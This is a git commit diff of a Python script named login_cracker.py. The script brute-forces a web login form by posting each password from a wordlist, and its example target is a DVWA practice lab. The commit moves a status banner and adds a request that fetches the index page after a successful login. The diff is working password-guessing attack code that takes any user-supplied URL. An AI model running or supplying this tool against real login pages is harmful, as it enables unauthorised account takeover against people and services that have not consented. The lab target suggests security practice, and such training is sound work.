08dc45bcd8466be70fc4e189fc1045be5dd8b4be
Andrea Dybendal <anddyb671@gmail.com>
2023-05-30 05:10:25 -0500

    Changed the code

--- login_cracker.py
+++ login_cracker.py
@@ -11,14 +11,6 @@ cprint(banner, 'blue')
 url = input("What URL do you want to bruteforce? (ex.http://192.168.142.138/dvwa/login.php): ")
 username = input("What username do you want to try? (ex admin): ")
 
-
-#The banner with information about when the cracking starts + the hash to be cracked
-cprint("_" * 50, 'blue')
-cprint("The URL is " + url, 'blue')
-cprint("Cracking with username " + username, 'blue')
-cprint("Cracking login page started at: " + str(datetime.now()), 'blue')
-cprint("_" * 50, 'blue')
-
 # This is where we ask the user for a password file. The program will read it
 # if the password is found, it will be printed in green
 # if the password is not found, it will be printed as 'attempt failed' in red
@@ -27,6 +19,16 @@ try:
     file = open(password_file, "r")
 except FileNotFoundError:
     cprint("The file was not found...", 'red')
+
+#The banner with information about when the cracking starts + the hash to be cracked
+cprint("_" * 50, 'blue')
+cprint("The URL is " + url, 'blue')
+cprint("Cracking with username " + username, 'blue')
+cprint("Cracking with this passwordfile: " + password_file, 'blue')
+cprint("Cracking login page started at: " + str(datetime.now()), 'blue')
+cprint("_" * 50, 'blue')
+
+
 
 # Now the program will try all passwords in the password file
 
@@ -37,11 +39,14 @@ try:
     data = {'username':username, 'password':password, "Login":'submit'}
     send_data_url = requests.post(url, data=data)
 
+    if "Login successful" in str(send_data_url.content):
+        cprint(requests.get(url = 'http://192.168.142.138/dvwa/index.php').text, 'blue')
+        
     if "Login failed" in str(send_data_url.content):
         cprint("[*] Attempting password: %s" % password, 'red')
     else:
         cprint("[*] Password found: %s " % password,'green')
-        cprint(requests.get(url = 'http://192.168.142.138/dvwa/index.php').text, 'blue')
+        
 
 except:
     cprint("There was an error, please try again..", 'red')
